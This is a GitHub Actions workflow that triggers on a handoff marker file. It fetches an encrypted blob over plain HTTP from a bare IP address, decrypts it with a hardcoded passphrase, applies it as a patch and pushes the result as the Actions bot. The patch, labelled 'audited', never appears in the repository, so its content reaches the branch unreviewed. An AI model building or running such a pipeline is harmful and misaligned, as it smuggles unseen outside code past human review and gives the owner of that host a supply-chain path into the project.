name: Apply unified weather patch

on:
  push:
    branches:
      - codex/unify-weather-signal-pipeline
    paths:
      - .handoff/READY

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          ref: codex/unify-weather-signal-pipeline
      - name: Fetch encrypted audited patch
        run: |
          curl --fail --retry 4 --connect-timeout 10 --max-time 60 \
            http://165.245.174.128:18765/bundle-7f2c91.bin \
            -o /tmp/weather-unified.patch.enc
          echo "faeb82b0527ba16c2373d8caa98243c6e539ddb13cf09515ebc673f8bf25f655  /tmp/weather-unified.patch.enc" | sha256sum -c -
      - name: Decrypt and validate exact patch
        run: |
          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 \
            -in /tmp/weather-unified.patch.enc \
            -out /tmp/weather-unified.patch \
            -pass pass:2dc54045abf4174ba6711348778ff7f3dc9aa1a7057b12bc0e18d769e950d6cd
          echo "c96c8dd4ab0f7ccb7e6a8318fb955e831bbc50879d91573bee6a8524ed420634  /tmp/weather-unified.patch" | sha256sum -c -
          git apply --check /tmp/weather-unified.patch
      - name: Apply exact audited patch
        run: |
          git apply --index /tmp/weather-unified.patch
          git status --short
      - name: Commit and publish
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git commit -m "feat: publish audited unified weather pipeline"
          git push origin HEAD:codex/unify-weather-signal-pipeline
